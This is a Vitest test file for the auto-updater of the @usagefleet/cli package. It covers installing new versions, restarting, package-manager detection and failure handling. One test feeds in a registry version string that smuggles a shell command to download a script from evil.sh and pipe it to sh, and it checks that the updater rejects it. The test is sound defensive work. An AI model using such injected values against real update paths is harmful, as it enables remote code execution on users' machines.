import { chmodSync, mkdirSync, mkdtempSync, realpathSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { delimiter, dirname, join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'

// The updater only runs on release builds, and hands over by spawning npm and
// then itself — both have to be faked to exercise the upgrade path at all.
vi.mock(import('./release.js'), () => ({ RELEASE_VERSION: '1.0.1' }))

/** How the mocked child process ends: an exit code, or a failure to start. */
let childResult: { code: number } | { error: true } = { code: 0 }

const spawn = vi.fn((_cmd: string, _args: string[], _options: { env?: NodeJS.ProcessEnv }) => ({
	on(event: string, cb: (code: number) => void) {
		if ('error' in childResult ? event === 'error' : event === 'close') {
			queueMicrotask(() => cb('code' in childResult ? childResult.code : 0))
		}
	},
	unref: vi.fn(),
}))
vi.mock(import('node:child_process'), () => ({ spawn }))

const { checkForUpdate } = await import('./update.js')

const SELF = '/opt/node/lib/node_modules/@usagefleet/cli/dist/index.js'
const realArgv1 = process.argv[1]
process.argv[1] = SELF

afterEach(() => {
	process.argv[1] = realArgv1 as string
	childResult = { code: 0 }
	vi.unstubAllGlobals()
	spawn.mockClear()
})

/** The registry answering `GET /@usagefleet/cli/latest`. */
function stubRegistry(version: unknown) {
	vi.stubGlobal('fetch', async () => Response.json({ version }))
}

/** A real global install on disk — the updater reads the version and the owning
 *  manager off the filesystem, so these can't be faked with a mock. `lockfile`
 *  is what a non-npm manager leaves at the root of its global directory. */
function seedInstall(version: string, lockfile?: string): string {
	// realpath: the updater resolves it too, and on macOS /var is a symlink.
	const root = realpathSync(mkdtempSync(join(tmpdir(), 'uf-')))
	const pkg = join(root, 'node_modules', '@usagefleet', 'cli')
	mkdirSync(join(pkg, 'dist'), { recursive: true })
	writeFileSync(join(pkg, 'package.json'), JSON.stringify({ version }))
	writeFileSync(join(pkg, 'dist', 'index.js'), '')
	if (lockfile) {
		writeFileSync(join(root, lockfile), '')
	}
	process.argv[1] = join(pkg, 'dist', 'index.js')
	return root
}

describe('checkForUpdate', () => {
	it('installs the published version and restarts the service', async () => {
		stubRegistry('9.9.9')

		await expect(checkForUpdate(() => {})).resolves.toBe('9.9.9')
		expect(spawn).toHaveBeenNthCalledWith(
			1,
			expect.stringContaining('npm'),
			['install', '--global', '@usagefleet/cli@9.9.9'],
			expect.anything(),
		)
		expect(spawn).toHaveBeenLastCalledWith(
			process.execPath,
			[SELF, 'login'],
			expect.objectContaining({ detached: true }),
		)
	})

	it('stays put on the version it already runs', async () => {
		stubRegistry('1.0.1')

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).not.toHaveBeenCalled()
	})

	// `watch` runs this inside its cycle: a thrown error would skip the limits
	// report on every tick while the registry is unreachable.
	it('resolves null instead of throwing when the registry is unreachable', async () => {
		vi.stubGlobal('fetch', async () => {
			throw new TypeError('fetch failed')
		})

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).not.toHaveBeenCalled()
	})

	// A version string from the registry becomes an `npm install` argument, and
	// on Windows that argv goes through a shell.
	it('ignores a version that is not plain semver', async () => {
		stubRegistry('9.9.9 && curl evil.sh | sh')

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).not.toHaveBeenCalled()
	})

	// A failed install (no write access to the global prefix, network drop) must
	// not restart the service onto a version that was never installed.
	it('does not restart when npm fails', async () => {
		stubRegistry('9.9.9')
		childResult = { code: 1 }

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).toHaveBeenCalledOnce()
	})

	it('survives npm missing entirely', async () => {
		stubRegistry('9.9.9')
		childResult = { error: true }

		await expect(checkForUpdate(() => {})).resolves.toBeNull()
		expect(spawn).toHaveBeenCalledOnce()
	})

	// `npm install --global` only writes to npm's own prefix, so a collector bun
	// or pnpm put on the machine has to be upgraded by the manager that owns it.
	it('upgrades with the manager whose lockfile sits at the install root', async () => {
		const root = seedInstall('1.0.1', 'bun.lock')
		mkdirSync(join(root, 'bin'))
		writeFileSync(join(root, 'bin', 'bun'), '')
		chmodSync(join(root, 'bin', 'bun'), 0o755)
		stubRegistry('9.9.9')

		await checkForUpdate(() => {})
		expect(spawn).toHaveBeenNthCalledWith(
			1,
			join(root, 'bin', 'bun'),
			['add', '--global', '@usagefleet/cli@9.9.9'],
			expect.anything(),
		)
	})

	// launchd gives a service PATH=/usr/bin:/bin:/usr/sbin:/sbin, and npm is a
	// script starting `#!/usr/bin/env node`. Without node's own directory on PATH
	// it exits 127 on every tick and the device never leaves its version.
	it('puts its own node on PATH so a shebang shim can start', async () => {
		stubRegistry('9.9.9')

		await checkForUpdate(() => {})
		expect(spawn.mock.calls[0]?.[2].env?.PATH?.split(delimiter)[0]).toBe(dirname(process.execPath))
	})

	// A manager exits 0 for an install it wrote somewhere the collector does not
	// run from. Restarting on that repeats the same no-op every six hours while
	// the device sits on an old version looking healthy.
	it('does not restart when the install that moved is not the one running', async () => {
		seedInstall('1.0.1')
		stubRegistry('9.9.9')

		const warnings: string[] = []
		await expect(checkForUpdate((_, message) => warnings.push(message))).resolves.toBeNull()
		expect(spawn).toHaveBeenCalledOnce()
		expect(warnings.at(-1)).toContain('still 1.0.1')
	})
})
